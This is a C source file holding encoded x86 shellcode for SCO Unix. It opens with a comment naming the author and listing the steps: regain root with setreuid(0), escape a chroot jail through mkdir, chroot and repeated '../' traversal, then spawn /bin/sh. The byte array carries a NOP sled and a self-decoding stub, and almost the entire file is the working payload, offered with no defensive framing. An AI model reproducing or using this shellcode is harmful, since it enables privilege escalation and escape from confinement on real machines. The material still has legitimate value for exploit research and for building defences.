/*
 *  Sco chroot() shellcode by doble@iname.com
 *
 *  - setreuid(0); 
 *  - chroot-break (make a temp dir with mkdir(),
 *    chroot() to tempdir, do a number of ../
 *  - execve of /bin/sh
 *
 */

char shellcode[]=
  "\x90\x90\x90\x90\x90"
  "\x31\xdb"				// xorl %ebx,%ebx
  "\x31\xc9"				// xorl %ecx,%ecx

// decode

  "\xeb\x12"				// jmp A
  "\x5e"					// B: popl %esi
  "\xbf\x10\x10\x10\x10"		// movl 0x10101010,%edi
  "\xb1\x21"				// movb 33,%cl
  "\x29\x7e\x01"				// subl %edi,01(%esi)
  "\x83\xc6\x04"				// addl 4,%esi
  "\xe2\xf8"				// loop
  "\xeb\x05"				// jmp +5
  "\xe8\xe9\xff\xff\xff"		// A: call B
  "\x90"
  "\xfb\x5d"				// start: jmp uno 
  "\x6e"					// dos: popl %esi

// setuid(0)

  "\x41\xd0"				// xorl %eax,%eax
  "\xc0\x27"				// movb $0x17,%al
  "\x63"					// pushl %ebx
  "\x63"
  "\xaa\x10\x10\x10\x10\x17\x10"

// mkdir("sh")

  "\x41\xd0"				// xorl %eax,%eax
  "\xc0\x60"				// movb $0x50,%al
  "\x9d\x8e\x15"				// leal 5(%esi),%edi
  "\x67"					// pushl %edi
  "\x67"
  "\xaa\x10\x10\x10\x10\x17\x10"

// chroot("sh")

  "\x41\xd0"				// xorl %eax,%eax
  "\xc0\x4d"				// movb $03d,%al
  "\x9d\x8e\x15"				// leal 5(%esi),%edi
  "\x67"					// pushl %edi
  "\x67"
  "\xaa\x10\x10\x10\x10\x17\x10"

// chroot("../../../../../../../../../../../../");

  "\x41\xd0"				// xorl %eax,%eax
  "\xc0\x4d"				// movb $0x3d,%al
  "\x9d\x8e\x18"				// leal 8(%esi),%edi
  "\x67"					// pushl %edi
  "\x67"
  "\xaa\x10\x10\x10\x10\x17\x10"

// execve("/bin/sh",0,0);

  "\x41\xd0"				// xorl %eax,%eax
  "\xc0\x4b"				// movb $0x3b,%al
  "\x63"					// pushl %ebx
  "\x63"					// pushl %ebx 
  "\x66"					// pushl %esi
  "\x66"					// pushl %esi
  "\xaa\x10\x10\x10\x10\x17\x10"	// lcall 0x7,0x0

  "\xf8\xbe\x0f\x10\x10"		// uno: call dos

// strings

  "\x3f\x72\x79\x7e\x3f" 		// "/bin/" // 0(%esi)
  "\x83\x78\x10" // "sh\x10"  // 5(%esi)
  "\x3e\x3e\x3f\x3e\x3e\x3f\x3e\x3e\x3f"
  "\x3e\x3e\x3f\x3e\x3e\x3f\x3e\x3e\x3f"
  "\x3e\x3e\x3f\x3e\x3e\x3f\x3e\x3e\x3f"
  "\x3e\x3e\x3f\x3e\x3e\x3f\x3e\x3e\x3f\x10" 
  // "../../../../../../../../../../../../\x10"	// 8(%esi)
""; //